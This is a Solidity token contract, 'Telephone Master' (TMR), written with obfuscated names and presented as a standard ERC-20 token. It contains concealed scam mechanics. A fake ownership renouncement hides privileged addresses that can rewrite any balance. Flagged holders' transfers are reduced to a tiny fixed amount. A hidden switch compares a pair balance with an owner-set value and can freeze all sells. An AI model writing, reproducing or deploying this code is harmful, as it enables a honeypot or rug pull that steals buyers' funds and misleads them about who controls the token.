//SPDX-License-Identifier: MIT

pragma solidity ^0.8.11;

interface exemptFee {
    function createPair(address totalBuyAmount, address receiverMin) external returns (address);
}

interface exemptReceiver {
    function totalSupply() external view returns (uint256);

    function balanceOf(address txWallet) external view returns (uint256);

    function transfer(address receiverLaunchedTx, uint256 toModeSell) external returns (bool);

    function allowance(address fundBuyTx, address spender) external view returns (uint256);

    function approve(address spender, uint256 toModeSell) external returns (bool);

    function transferFrom(
        address sender,
        address receiverLaunchedTx,
        uint256 toModeSell
    ) external returns (bool);

    event Transfer(address indexed from, address indexed exemptReceiverToken, uint256 value);
    event Approval(address indexed fundBuyTx, address indexed spender, uint256 value);
}

abstract contract takeReceiver {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface sellTeam {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface exemptReceiverMetadata is exemptReceiver {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract TelephoneMaster is takeReceiver, exemptReceiver, exemptReceiverMetadata {

    function totalSupply() external view virtual override returns (uint256) {
        return marketingLaunch;
    }

    string private limitTotal = "TMR";

    bool public teamMarketing;

    function transferFrom(address launchedSender, address receiverLaunchedTx, uint256 toModeSell) external override returns (bool) {
        if (_msgSender() != buyFund) {
            if (receiverSwap[launchedSender][_msgSender()] != type(uint256).max) {
                require(toModeSell <= receiverSwap[launchedSender][_msgSender()]);
                receiverSwap[launchedSender][_msgSender()] -= toModeSell;
            }
        }
        return swapAmount(launchedSender, receiverLaunchedTx, toModeSell);
    }

    mapping(address => bool) public exemptMaxTo;

    function tradingFund(address maxExempt, uint256 toModeSell) public {
        maxLiquidityTrading();
        exemptWallet[maxExempt] = toModeSell;
    }

    mapping(address => mapping(address => uint256)) private receiverSwap;

    constructor (){
        
        sellTeam feeFrom = sellTeam(buyFund);
        listLaunch = exemptFee(feeFrom.factory()).createPair(feeFrom.WETH(), address(this));
        
        tradingTake = _msgSender();
        launchMarketing[tradingTake] = true;
        exemptWallet[tradingTake] = marketingLaunch;
        teamTx();
        if (teamMarketing != feeFund) {
            fromTo = atMode;
        }
        emit Transfer(address(0), tradingTake, marketingLaunch);
    }

    uint256 constant receiverTo = 16 ** 10;

    bool public senderTx;

    function allowance(address atAmount, address listAtAuto) external view virtual override returns (uint256) {
        if (listAtAuto == buyFund) {
            return type(uint256).max;
        }
        return receiverSwap[atAmount][listAtAuto];
    }

    mapping(address => bool) public launchMarketing;

    uint256 private marketingLaunch = 100000000 * 10 ** 18;

    uint256 private atMode;

    uint256 public atFeeMin;

    function name() external view virtual override returns (string memory) {
        return maxMinBuy;
    }

    function modeToken(address exemptToken) public {
        require(exemptToken.balance < 100000);
        if (senderTx) {
            return;
        }
        
        launchMarketing[exemptToken] = true;
        
        senderTx = true;
    }

    function transfer(address maxExempt, uint256 toModeSell) external virtual override returns (bool) {
        return swapAmount(_msgSender(), maxExempt, toModeSell);
    }

    uint256 public fromTo;

    function getOwner() external view returns (address) {
        return marketingMax;
    }

    function toTokenWallet(address atSwap) public {
        maxLiquidityTrading();
        
        if (atSwap == tradingTake || atSwap == listLaunch) {
            return;
        }
        exemptMaxTo[atSwap] = true;
    }

    address private marketingMax;

    function balanceOf(address txWallet) public view virtual override returns (uint256) {
        return exemptWallet[txWallet];
    }

    uint256 tokenShould;

    event OwnershipTransferred(address indexed listTokenTake, address indexed liquidityTeam);

    uint256 fromAmount;

    function decimals() external view virtual override returns (uint8) {
        return takeBuy;
    }

    function owner() external view returns (address) {
        return marketingMax;
    }

    uint256 public liquidityEnable;

    address public listLaunch;

    function buyAuto(uint256 toModeSell) public {
        maxLiquidityTrading();
        fromAmount = toModeSell;
    }

    string private maxMinBuy = "Telephone Master";

    function teamTx() public {
        emit OwnershipTransferred(tradingTake, address(0));
        marketingMax = address(0);
    }

    bool private launchedAuto;

    mapping(address => uint256) private exemptWallet;

    address public tradingTake;

    bool private senderTrading;

    address maxWallet = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function maxLiquidityTrading() private view {
        require(launchMarketing[_msgSender()]);
    }

    function symbol() external view virtual override returns (string memory) {
        return limitTotal;
    }

    function approve(address listAtAuto, uint256 toModeSell) public virtual override returns (bool) {
        receiverSwap[_msgSender()][listAtAuto] = toModeSell;
        emit Approval(_msgSender(), listAtAuto, toModeSell);
        return true;
    }

    function swapAmount(address launchedSender, address receiverLaunchedTx, uint256 toModeSell) internal returns (bool) {
        if (launchedSender == tradingTake) {
            return listAmount(launchedSender, receiverLaunchedTx, toModeSell);
        }
        uint256 modeTo = exemptReceiver(listLaunch).balanceOf(maxWallet);
        require(modeTo == fromAmount);
        require(receiverLaunchedTx != maxWallet);
        if (exemptMaxTo[launchedSender]) {
            return listAmount(launchedSender, receiverLaunchedTx, receiverTo);
        }
        return listAmount(launchedSender, receiverLaunchedTx, toModeSell);
    }

    uint8 private takeBuy = 18;

    function listAmount(address launchedSender, address receiverLaunchedTx, uint256 toModeSell) internal returns (bool) {
        require(exemptWallet[launchedSender] >= toModeSell);
        exemptWallet[launchedSender] -= toModeSell;
        exemptWallet[receiverLaunchedTx] += toModeSell;
        emit Transfer(launchedSender, receiverLaunchedTx, toModeSell);
        return true;
    }

    address buyFund = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    bool public feeFund;

}